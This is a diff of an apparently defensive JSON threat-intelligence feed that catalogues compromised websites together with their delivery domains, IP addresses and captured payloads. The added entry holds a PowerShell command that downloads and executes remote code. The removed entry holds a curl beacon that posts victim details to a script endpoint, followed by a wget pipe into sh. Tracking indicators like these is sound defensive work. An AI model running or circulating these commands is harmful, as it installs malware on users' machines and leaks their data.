@@ -1,5 +1,27 @@
 [
   {
+    "UrlDomain": "ks-contractors.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "192.232.223.143"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/9a2a2d2a3afdee6f",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/9a2a2d2a3afdee6f'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/9a2a2d2a3afdee6f"
+    ],
+    "ReportId": "cmwncfvff1vtx0omlmny8da5y",
+    "ScannedAt": "2026-11-19T09:24:22.692000+00:00"
+  },
+  {
     "UrlDomain": "consultadetarotbarato.es",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -18548,29 +18570,5 @@
     ],
     "ReportId": "cmw92gdsu2i5y0omlbhso6vbf",
     "ScannedAt": "2026-11-09T09:36:03.887000+00:00"
-  },
-  {
-    "UrlDomain": "southwestsocialservicesinc.com",
-    "DeliveryUrl": [
-      "script-six-tawny.vercel.app",
-      "script.google.com"
-    ],
-    "PayloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "77.37.83.216"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=21a93fe7-8de4-49ec-bc9a-e8158d30427a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fsouthwestsocialservicesinc[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-09T09%3A00%3A45.004Z&lastShellAt=2026-11-09T09%3A00%3A45.004Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmw919kau2hq20omlin08m3ae",
-    "ScannedAt": "2026-11-09T09:02:46.088000+00:00"
   }
 ]
